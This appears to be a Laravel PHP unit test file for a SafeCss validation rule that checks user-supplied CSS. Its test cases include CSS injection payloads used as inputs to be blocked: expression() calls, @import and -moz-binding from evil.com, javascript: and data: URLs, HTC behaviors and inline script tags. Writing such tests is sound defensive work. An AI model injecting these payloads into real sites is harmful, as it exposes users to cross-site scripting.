<?php

declare(strict_types=1);

namespace Tests\Unit\Rules;

use App\Rules\SafeCss;
use Illuminate\Support\Facades\Validator;
use Tests\TestCase;

class SafeCssTest extends TestCase
{
    private function passes(string $css): bool
    {
        $validator = Validator::make(
            ['css' => $css],
            ['css' => [new SafeCss]],
        );

        return $validator->passes();
    }

    public function test_normal_css_passes(): void
    {
        $this->assertTrue($this->passes('body { color: #333; font-size: 14px; margin: 0 auto; }'));
    }

    public function test_complex_css_passes(): void
    {
        $this->assertTrue($this->passes('.container { display: flex; justify-content: center; background-color: rgba(0,0,0,0.5); }'));
    }

    public function test_css_variables_pass(): void
    {
        $this->assertTrue($this->passes(':root { --color-bg: #fff; } body { color: var(--color-bg); }'));
    }

    public function test_media_queries_pass(): void
    {
        $this->assertTrue($this->passes('@media (max-width: 768px) { .col { width: 100%; } }'));
    }

    public function test_expression_is_blocked(): void
    {
        $this->assertFalse($this->passes('body { width: expression(document.body.clientWidth); }'));
    }

    public function test_import_is_blocked(): void
    {
        $this->assertFalse($this->passes('@import url("https://evil.com/hack.css");'));
    }

    public function test_url_javascript_is_blocked(): void
    {
        $this->assertFalse($this->passes('body { background: url(javascript:alert(1)); }'));
    }

    public function test_url_data_is_blocked(): void
    {
        $this->assertFalse($this->passes('body { background: url(data:text/html,<script>alert(1)</script>); }'));
    }

    public function test_moz_binding_is_blocked(): void
    {
        $this->assertFalse($this->passes('body { -moz-binding: url("http://evil.com/xbl"); }'));
    }

    public function test_behavior_is_blocked(): void
    {
        $this->assertFalse($this->passes('body { behavior: url(xss.htc); }'));
    }

    public function test_binding_is_blocked(): void
    {
        $this->assertFalse($this->passes('body { binding(something); }'));
    }

    public function test_script_tag_is_blocked(): void
    {
        $this->assertFalse($this->passes('body {} <script>alert(1)</script>'));
    }

    public function test_case_insensitive_expression(): void
    {
        $this->assertFalse($this->passes('body { width: EXPRESSION(document.body.clientWidth); }'));
    }

    public function test_case_insensitive_import(): void
    {
        $this->assertFalse($this->passes('@IMPORT url("https://evil.com/hack.css");'));
    }

    public function test_case_insensitive_behavior(): void
    {
        $this->assertFalse($this->passes('body { BEHAVIOR: url(xss.htc); }'));
    }

    public function test_error_message(): void
    {
        $validator = Validator::make(
            ['custom_css' => '@import url("evil.css");'],
            ['custom_css' => [new SafeCss]],
        );

        $this->assertFalse($validator->passes());
        $this->assertEquals(
            'The custom css contains potentially dangerous CSS patterns.',
            $validator->errors()->first('custom_css'),
        );
    }

    public function test_null_value_passes(): void
    {
        $validator = Validator::make(
            ['css' => null],
            ['css' => ['nullable', new SafeCss]],
        );

        $this->assertTrue($validator->passes());
    }

    public function test_empty_string_passes(): void
    {
        $this->assertTrue($this->passes(''));
    }
}
